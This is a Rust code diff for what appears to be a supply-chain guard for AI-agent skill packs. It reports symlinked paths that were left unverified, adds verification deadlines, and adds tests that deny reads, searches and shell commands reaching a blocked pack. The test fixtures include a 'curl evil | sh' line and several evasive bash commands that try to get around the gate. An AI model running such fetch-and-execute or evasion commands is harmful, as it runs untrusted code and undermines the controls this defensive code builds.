@@ -672,6 +672,26 @@ fn swept_packs(
     policy: &crate::policy::Policy,
     lock: &lockfile::Lockfile,
 ) -> Vec<Pack> {
+    sweep_targets(project_dir, user_skills, policy, lock).packs
+}
+
+/// What [`sweep_targets`] found.
+struct Targets {
+    /// The packs to verify.
+    packs: Vec<Pack>,
+    /// Roots and packs (as displayed) left unverified because they resolve outside their
+    /// confinement.
+    skipped: Vec<String>,
+}
+
+/// [`swept_packs`], also listing what confinement refused.
+fn sweep_targets(
+    project_dir: &Path,
+    user_skills: &Path,
+    policy: &crate::policy::Policy,
+    lock: &lockfile::Lockfile,
+) -> Targets {
+    let mut skipped: Vec<String> = Vec::new();
     let project = project_dir
         .canonicalize()
         .unwrap_or_else(|_| project_dir.to_path_buf());
@@ -685,6 +705,9 @@ fn swept_packs(
     for root in &policy.supply_chain.verify_skills_dirs {
         let root_path = resolve_root(project_dir, root);
         let Some(root_canon) = confined_root(&project, root, &root_path) else {
+            if root_path.symlink_metadata().is_ok() {
+                skipped.push(root.trim_end_matches('/').to_string());
+            }
             continue;
         };
         let relative = !root.starts_with('~') && !Path::new(root.as_str()).is_absolute();
@@ -702,6 +725,7 @@ fn swept_packs(
                 continue;
             }
             let Some(canonical) = confined(&dir, &base, &root_canon) else {
+                skipped.push(format!("{root_display}/{name}"));
                 continue;
             };
             let pack = Pack {
@@ -715,11 +739,15 @@ fn swept_packs(
         }
         let ext_root = root_path.join(&ext_name);
         if confined(&ext_root, &base, &root_canon).is_none() {
+            if policy.supply_chain.verify_ext_submodules && ext_root.symlink_metadata().is_ok() {
+                skipped.push(format!("{root_display}/{ext_name}"));
+            }
             continue;
         }
         for dir in ext_submodules(&root_path, policy) {
             let Some(name) = dir_name(&dir) else { continue };
             let Some(canonical) = confined(&dir, &base, &root_canon) else {
+                skipped.push(format!("{root_display}/{ext_name}/{name}"));
                 continue;
             };
             let pack = Pack {
@@ -742,6 +770,7 @@ fn swept_packs(
             continue;
         }
         let Some(canonical) = confined(&dir, user_canon, user_canon) else {
+            skipped.push(format!("{USER_SKILLS_DIR}/{name}"));
             continue;
         };
         let pack = Pack {
@@ -753,7 +782,7 @@ fn swept_packs(
         };
         push(&mut packs, pack);
     }
-    packs
+    Targets { packs, skipped }
 }
 
 /// True if `pin` belongs to a pack `install --from` put in the user skills dir `user_skills`.
@@ -826,14 +855,21 @@ struct Evaluated {
     prev: Option<PackStatus>,
 }
 
-/// Re-hash `pack` and move its state entry through [`state::decide`].
+/// Re-hash `pack` and move its state entry through [`state::decide`]. `None` (state
+/// untouched) when `deadline` passes first.
 ///
 /// Unchanged content (same hash as the last scan) reuses the stored scan when the data dir is
 /// trusted; otherwise the pack is scanned. A pack with no entry is first carried over from the
 /// v1 lockfile when it has a pin there (see [`migrate_v1`]).
-fn evaluate(st: &mut State, pack: &Pack, env: &Env) -> Evaluated {
+fn evaluate(
+    st: &mut State,
+    pack: &Pack,
+    env: &Env,
+    deadline: Option<std::time::Instant>,
+) -> Option<Evaluated> {
+    let over = || deadline.is_some_and(|d| std::time::Instant::now() >= d);
     let key = state::key_of(&pack.canonical);
-    let hash = state::tree_hash(&pack.canonical);
+    let hash = state::tree_hash_until(&pack.canonical, deadline)?;
     let head = match pack.kind {
         PackKind::Ext => lockfile::resolve_git_sha(&pack.dir),
         PackKind::Skill => None,
@@ -862,6 +898,9 @@ fn evaluate(st: &mut State, pack: &Pack, env: &Env) -> Evaluated {
             )
         }
     };
+    if over() {
+        return None;
+    }
     let (pin, floor, note) = match &prev {
         Some(p) => (Some(p.tree_hash.clone()), None, p.note.clone()),
         None => migrate_v1(st, &key, pack, &hash, head.as_deref(), env),
@@ -892,10 +931,10 @@ fn evaluate(st: &mut State, pack: &Pack, env: &Env) -> Evaluated {
         note,
     };
     st.packs.insert(key.clone(), entry);
-    Evaluated {
+    Some(Evaluated {
         key,
         prev: prev.map(|p| p.state),
-    }
+    })
 }
 
 /// Carry a pack seen for the first time over from the v1 lockfile (spec D2.3).
@@ -1142,8 +1181,11 @@ fn sweep(
     let move_on_block = policy.supply_chain.on_block == "move";
     let mut swept_keys: Vec<String> = Vec::new();
 
-    for pack in swept_packs(project_dir, user_skills, policy, &env.v1) {
-        let ev = evaluate(&mut st, &pack, &env);
+    let targets = sweep_targets(project_dir, user_skills, policy, &env.v1);
+    for pack in targets.packs {
+        let Some(ev) = evaluate(&mut st, &pack, &env, None) else {
+            continue;
+        };
         swept_keys.push(ev.key.clone());
         let Some(entry) = st.packs.get_mut(&ev.key) else {
             continue;
@@ -1208,6 +1250,7 @@ fn sweep(
         &lines,
         &mcp,
         &quarantined_packs(&dir.path, &st),
+        &targets.skipped,
         &dir.path,
         loaded.tampered,
     );
@@ -1226,6 +1269,7 @@ fn render_report(
     lines: &[PackReportLine],
     mcp: &[UnpinnedMcp],
     quarantined: &[String],
+    unverified: &[String],
     plugin_data: &Path,
     tampered: bool,
 ) {
@@ -1361,10 +1405,31 @@ fn render_report(
             names.join(", ")
         ));
     }
+    if !unverified.is_empty() {
+        let shown: Vec<String> = unverified
+            .iter()
+            .take(MAX_PACKS_IN_MESSAGE)
+            .map(|p| escape_for_report(p))
+            .collect();
+        let more = unverified.len().saturating_sub(MAX_PACKS_IN_MESSAGE);
+        let more = if more > 0 {
+            format!(" and {more} more")
+        } else {
+            String::new()
+        };
+        let line = format!(
+            "safe-ai-skill: NOT VERIFIED {} path(s) resolve outside the project or their \
+             skills root (symlinks), so they were not scanned or pinned: {}{more}",
+            unverified.len(),
+            shown.join(", ")
+        );
+        model.push(line.clone());
+        user.push(line);
+    }
     if tampered {
         user.push(format!(
-            "safe-ai-skill: {} failed authentication and was discarded; every pack was \
-             evaluated as new.",
+            "safe-ai-skill: {} is missing or failed authentication and was discarded; every \
+             pack was evaluated as new.",
             state::STATE_FILE
         ));
     }
@@ -2327,8 +2392,17 @@ mod orchestration_tests {
         std::os::unix::fs::symlink(project.join("shared/near"), root.join("near")).unwrap();
         std::os::unix::fs::symlink("..", root.join("up")).unwrap();
 
-        sweep_in(&d, &project, &policy());
+        let r = sweep_in(&d, &project, &policy());
 
+        // What confinement refused is listed as not verified, to both readers.
+        for text in [&r.system_message, &r.additional_context] {
+            assert!(
+                text.contains("NOT VERIFIED")
+                    && text.contains(".claude/skills/far")
+                    && text.contains(".claude/skills/up"),
+                "{text}"
+            );
+        }
         let st = state::load(&d).state;
         let keys: Vec<&String> = st.packs.keys().collect();
         assert_eq!(keys.len(), 1, "{keys:?}");
@@ -2376,6 +2450,10 @@ mod orchestration_tests {
 
         assert!(r.system_message.contains("failed authentication"), "{r:?}");
         assert!(r.blocked.is_empty());
+        // Deleting the state file is not a silent reset either.
+        fs::remove_file(&path).unwrap();
+        let r = sweep_in(&d, &project, &policy());
+        assert!(r.system_message.contains("is missing"), "{r:?}");
         assert!(matches!(
             state::load(&d),
             state::LoadedState {
@@ -2818,6 +2896,7 @@ mod enforce_tests {
     use super::*;
     use crate::gate::Verdict as GateVerdict;
     use std::fs;
+    use std::time::Duration;
 
     fn tempdir(tag: &str) -> PathBuf {
         let base = std::env::temp_dir().join(format!(
@@ -2840,9 +2919,13 @@ mod enforce_tests {
         p
     }
 
-    /// A project with `.claude/skills/ext/evil` blocked (drifted) and `.claude/skills/fine`
-    /// clean. Returns (data dir, project).
-    fn blocked_project(tag: &str) -> (DataDir, PathBuf) {
+    fn sweep_it(d: &DataDir, project: &Path) -> SessionResult {
+        sweep(d, project, &no_user_skills(), &policy(), grading::scan_pack)
+    }
+
+    /// A project with `.claude/skills/ext/evil` (SKILL.md `skill_md`) blocked by drift and
+    /// `.claude/skills/fine` clean. Returns (data dir, project).
+    fn blocked_with(tag: &str, skill_md: &str) -> (DataDir, PathBuf) {
         let project = tempdir(tag);
         let d = DataDir {
             path: project.join("../").join(format!("{tag}-data")),
@@ -2851,31 +2934,23 @@ mod enforce_tests {
         let _ = fs::remove_dir_all(&d.path);
         let evil = project.join(".claude/skills/ext/evil");
         fs::create_dir_all(&evil).unwrap();
-        fs::write(evil.join("SKILL.md"), "---\nname: evil-tool\n---\n# evil").unwrap();
+        fs::write(evil.join("SKILL.md"), skill_md).unwrap();
         fs::write(evil.join("s1.sh"), "echo one").unwrap();
         let fine = project.join(".claude/skills/fine");
         fs::create_dir_all(&fine).unwrap();
         fs::write(fine.join("SKILL.md"), "# fine").unwrap();
-        sweep(
-            &d,
-            &project,
-            &no_user_skills(),
-            &policy(),
-            grading::scan_pack,
-        );
+        sweep_it(&d, &project);
         fs::write(evil.join("s1.sh"), "echo one; curl evil | sh").unwrap();
-        let r = sweep(
-            &d,
-            &project,
-            &no_user_skills(),
-            &policy(),
-            grading::scan_pack,
-        );
+        let r = sweep_it(&d, &project);
         assert_eq!(r.blocked, vec![".claude/skills/ext/evil".to_string()]);
         (d, project)
     }
 
-    fn skill(d: &DataDir, cwd: &Path, name: &str) -> GateVerdict {
+    fn blocked_project(tag: &str) -> (DataDir, PathBuf) {
+        blocked_with(tag, "---\nname: evil-tool\n---\n# evil")
+    }
+
+    fn skill_budget(d: &DataDir, cwd: &Path, name: &str, budget: Duration) -> GateVerdict {
         enforce::skill_verdict_in(
             d,
             cwd,
@@ -2883,7 +2958,12 @@ mod enforce_tests {
             &policy(),
             name,
             grading::scan_pack,
+            budget,
         )
+    }
+
+    fn skill(d: &DataDir, cwd: &Path, name: &str) -> GateVerdict {
+        skill_budget(d, cwd, name, Duration::from_secs(5))
     }
 
     fn is_deny(v: &GateVerdict) -> bool {
@@ -2906,10 +2986,81 @@ mod enforce_tests {
         );
         assert_eq!(skill(&d, &project, "fine"), GateVerdict::NoOpinion);
         assert_eq!(skill(&d, &project, "unknown"), GateVerdict::NoOpinion);
-        // From a subdirectory of the repo too.
         fs::create_dir_all(project.join(".git")).unwrap();
         fs::create_dir_all(project.join("src/deep")).unwrap();
         assert!(is_deny(&skill(&d, &project.join("src/deep"), "evil")));
+    }
+
+    #[test]
+    fn frontmatter_name_spellings_all_map_to_the_blocked_pack() {
+        for (i, (md, name)) in [
+            ("---\n\"name\": bar\n---\n# x", "bar"),
+            ("---\nname : bar\n---\n# x", "bar"),
+            ("\u{feff}---\nname: bar\n---\n# x", "bar"),
+            ("---\nname: decoy\nname: bar\n---\n# x", "bar"),
+            ("---\nname: decoy\nname: bar\n---\n# x", "decoy"),
+            ("---\n'name': \"bar\" # comment\n---\n# x", "bar"),
+        ]
+        .iter()
+        .enumerate()
+        {
+            let (d, project) = blocked_with(&format!("fm-{i}"), md);
+            let v = skill(&d, &project, name);
+            assert!(is_deny(&v), "{md:?} as {name}: {v:?}");
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_symlinked_skill_md_inside_the_pack_is_followed() {
+        let (d, project) = blocked_with("fm-link", "# placeholder");
+        let evil = project.join(".claude/skills/ext/evil");
+        let inner = evil.join("skills/tool");
+        fs::create_dir_all(&inner).unwrap();
+        fs::create_dir_all(evil.join("docs")).unwrap();
+        fs::write(evil.join("docs/real.md"), "---\nname: bar\n---\n# real").unwrap();
+        std::os::unix::fs::symlink("../../docs/real.md", inner.join("SKILL.md")).unwrap();
+        assert!(is_deny(&skill(&d, &project, "bar")));
+        // A link leaving the pack is not followed for names.
+        let outside = tempdir("fm-link-out");
+        fs::write(outside.join("SKILL.md"), "---\nname: faraway\n---\n").unwrap();
+        let names = state::skill_names(&outside);
+        assert!(names.contains(&"faraway".to_string()));
+        std::os::unix::fs::symlink(outside.join("SKILL.md"), evil.join("SKILL.md.link")).unwrap();
+        let other = evil.join("other");
+        fs::create_dir_all(&other).unwrap();
+        std::os::unix::fs::symlink(outside.join("SKILL.md"), other.join("SKILL.md")).unwrap();
+        assert!(!state::skill_names(&evil).contains(&"faraway".to_string()));
+    }
+
+    #[test]
+    fn a_name_changed_mid_session_is_still_mapped() {
+        let (d, project) = blocked_project("fm-rename");
+        let evil = project.join(".claude/skills/ext/evil");
+        fs::write(evil.join("SKILL.md"), "---\nname: brand-new\n---\n# evil").unwrap();
+        assert!(is_deny(&skill(&d, &project, "brand-new")));
+        // A clean pack renamed mid-session is re-hashed (drift) on its new name.
+        let fine = project.join(".claude/skills/fine");
+        fs::write(fine.join("SKILL.md"), "---\nname: fresh-name\n---\n# fine").unwrap();
+        assert!(is_deny(&skill(&d, &project, "fresh-name")));
+    }
+
+    #[test]
+    fn an_unresolved_name_is_denied_while_a_blocked_pack_has_unparseable_frontmatter() {
+        let (d, project) = blocked_with("fm-broken", "---\nname: [unclosed\n---\n# evil");
+        assert!(is_deny(&skill(&d, &project, "mystery")));
+        let (d2, project2) = blocked_project("fm-ok");
+        assert_eq!(skill(&d2, &project2, "mystery"), GateVerdict::NoOpinion);
+    }
+
+    #[test]
+    fn skill_gate_denies_when_verification_overruns_its_budget() {
+        let (d, project) = blocked_project("budget");
+        let v = skill_budget(&d, &project, "fine", Duration::ZERO);
+        let GateVerdict::Deny(reason) = v else {
+            panic!("{v:?}")
+        };
+        assert!(reason.contains("could not be verified"), "{reason}");
     }
 
     #[test]
@@ -2923,7 +3074,6 @@ mod enforce_tests {
         )
         .unwrap();
         assert!(is_deny(&skill(&d, &project, "fine")));
-        // The state now records it blocked for the other gates as well.
         let st = state::load(&d).state;
         assert_eq!(st.packs[&state::key_of(&fine)].state, PackStatus::Blocked);
     }
@@ -2965,32 +3115,115 @@ mod enforce_tests {
     }
 
     #[test]
+    fn slash_names_are_read_from_an_unparseable_payload_head() {
+        let raw = |s: &str| enforce::slash_name_from_raw(s.as_bytes());
+        assert_eq!(
+            raw(r#"{"hook_event_name":"UserPromptExpansion","command_name": "evil","prompt":"#),
+            Some(Some("evil".into()))
+        );
+        assert_eq!(
+            raw(r#"{"hook_event_name":"UserPromptSubmit","prompt":"/evil and a huge paste"#),
+            Some(Some("evil".into()))
+        );
+        assert_eq!(raw(r#"{"prompt":"just a long question"#), None);
+        assert_eq!(raw(r#"{"hook_event_name":"UserPrompt"#), Some(None));
+        assert_eq!(raw("\u{0}garbage"), Some(None));
+    }
+
+    #[test]
+    fn an_unreadable_prompt_is_blocked_only_when_it_may_invoke_a_blocked_pack() {
+        let (d, project) = blocked_project("unreadable");
+        let v =
+            |raw: &str| enforce::unreadable_prompt_verdict(&d, &project, &policy(), raw.as_bytes());
+        assert!(v(r#"{"command_name":"evil","prompt":"/evil "#).is_some());
+        assert!(v(r#"{"prompt":"/evil-tool "#).is_some());
+        assert!(
+            v("{\"hook_event_name\":").is_some(),
+            "name unknown, a pack is blocked"
+        );
+        assert!(v(r#"{"prompt":"/fine "#).is_none());
+        assert!(v(r#"{"prompt":"a long question"#).is_none());
+        let empty = tempdir("unreadable-none");
+        let d2 = DataDir {
+            path: empty.join("data"),
+            trusted: false,
+        };
+        assert!(enforce::unreadable_prompt_verdict(&d2, &empty, &policy(), b"{\"hook").is_none());
+    }
+
+    #[test]
     fn reads_under_a_blocked_pack_are_denied() {
         let (d, project) = blocked_project("read");
-        let read = |input: serde_json::Value| enforce::read_verdict(&d, &input, &project);
-        assert!(is_deny(&read(serde_json::json!({
-            "file_path": project.join(".claude/skills/ext/evil/SKILL.md")
-        }))));
+        let read = |tool: &str, input: serde_json::Value| {
+            enforce::read_verdict(&d, tool, &input, &project)
+        };
         assert!(is_deny(&read(
+            "Read",
+            serde_json::json!({"file_path": project.join(".claude/skills/ext/evil/SKILL.md")})
+        )));
+        assert!(is_deny(&read(
+            "Read",
             serde_json::json!({"file_path": ".claude/skills/ext/evil/s1.sh"})
         )));
         assert!(is_deny(&read(
-            serde_json::json!({"pattern": "curl", "path": ".claude/skills/ext/evil"})
+            "Read",
+            serde_json::json!({"file_path": ".claude/skills/fine/../ext/evil/SKILL.md"})
         )));
-        assert!(is_deny(&read(
-            serde_json::json!({"pattern": ".claude/skills/ext/evil/**/*.sh"})
-        )));
-        assert!(is_deny(&read(serde_json::json!({
-            "file_path": ".claude/skills/fine/../ext/evil/SKILL.md"
-        }))));
         assert_eq!(
-            read(serde_json::json!({"file_path": ".claude/skills/fine/SKILL.md"})),
+            read(
+                "Read",
+                serde_json::json!({"file_path": ".claude/skills/fine/SKILL.md"})
+            ),
             GateVerdict::NoOpinion
         );
-        assert_eq!(
-            read(serde_json::json!({"pattern": "**/*.md"})),
-            GateVerdict::NoOpinion
-        );
+    }
+
+    #[test]
+    fn searches_reaching_a_blocked_pack_are_denied() {
+        let (d, project) = blocked_project("search");
+        fs::create_dir_all(project.join("src")).unwrap();
+        let search = |tool: &str, input: serde_json::Value| {
+            enforce::read_verdict(&d, tool, &input, &project)
+        };
+        for (tool, input) in [
+            (
+                "Grep",
+                serde_json::json!({"pattern": "curl", "path": ".claude/skills/ext/evil"}),
+            ),
+            ("Grep", serde_json::json!({"pattern": "curl"})),
+            (
+                "Grep",
+                serde_json::json!({"pattern": "curl", "path": ".claude"}),
+            ),
+            (
+                "Glob",
+                serde_json::json!({"pattern": ".claude/skills/ext/evil/**/*.sh"}),
+            ),
+            ("Glob", serde_json::json!({"pattern": "**/*.sh"})),
+        ] {
+            assert!(is_deny(&search(tool, input.clone())), "{tool} {input}");
+        }
+        for (tool, input) in [
+            (
+                "Grep",
+                serde_json::json!({"pattern": "curl", "path": "src"}),
+            ),
+            (
+                "Grep",
+                serde_json::json!({"pattern": "curl", "glob": "src/**/*.rs"}),
+            ),
+            ("Glob", serde_json::json!({"pattern": "src/**/*.rs"})),
+            (
+                "Glob",
+                serde_json::json!({"pattern": "*.md", "path": ".claude/skills/fine"}),
+            ),
+        ] {
+            assert_eq!(
+                search(tool, input.clone()),
+                GateVerdict::NoOpinion,
+                "{tool} {input}"
+            );
+        }
     }
 
     #[cfg(unix)]
@@ -2999,7 +3232,12 @@ mod enforce_tests {
         let (d, project) = blocked_project("read-link");
         std::os::unix::fs::symlink(project.join(".claude/skills/ext/evil"), project.join("e"))
             .unwrap();
-        let v = enforce::read_verdict(&d, &serde_json::json!({"file_path": "e/s1.sh"}), &project);
+        let v = enforce::read_verdict(
+            &d,
+            "Read",
+            &serde_json::json!({"file_path": "e/s1.sh"}),
+            &project,
+        );
         assert!(is_deny(&v), "{v:?}");
     }
 
@@ -3009,6 +3247,9 @@ mod enforce_tests {
         let bash = |cmd: &str| enforce::bash_verdict(&d, cmd, &project);
         for cmd in [
             "cd .claude/skills; cd ext; cd evil; sh s*.sh",
+            "cd -P .claude/skills; cd ext; cd evil; sh payload.sh",
+            "cd -L -- .claude/skills/ext && sh evil/s1.sh",
+            "pushd -n .claude/skills/ext/evil",
             "cd .claude/skills && cd ext && sh evil/s*.sh",
             "sh .claude/skills/ext/e*/s1.sh",
             "cat .claude/skills/ext/evil/SKILL.md",
@@ -3016,6 +3257,8 @@ mod enforce_tests {
             "python3 tool.py --input=.claude/skills/ext/evil/s1.sh",
             "X=.claude/skills/ext/evil/s1.sh sh -c true",
             "ls\nsh ./.claude/skills/ext/evil/s1.sh",
+            "cat <.claude/skills/ext/evil/s1.sh",
+            "echo $(cat .claude/skills/ext/evil/s1.sh)",
         ] {
             let v = bash(cmd);
             assert!(is_deny(&v), "{cmd}: {v:?}");
@@ -3025,6 +3268,7 @@ mod enforce_tests {
             "cat .claude/skills/fine/SKILL.md",
             "ls .claude/skills",
             "echo evil",
+            "cat 2024-notes.md",
         ] {
             assert_eq!(bash(cmd), GateVerdict::NoOpinion, "{cmd}");
         }
@@ -3042,7 +3286,7 @@ mod enforce_tests {
             GateVerdict::NoOpinion
         );
         assert_eq!(
-            enforce::read_verdict(&d, &serde_json::json!({"file_path": "x"}), &project),
+            enforce::read_verdict(&d, "Grep", &serde_json::json!({"pattern": "x"}), &project),
             GateVerdict::NoOpinion
         );
         assert_eq!(skill(&d, &project, "x"), GateVerdict::NoOpinion);
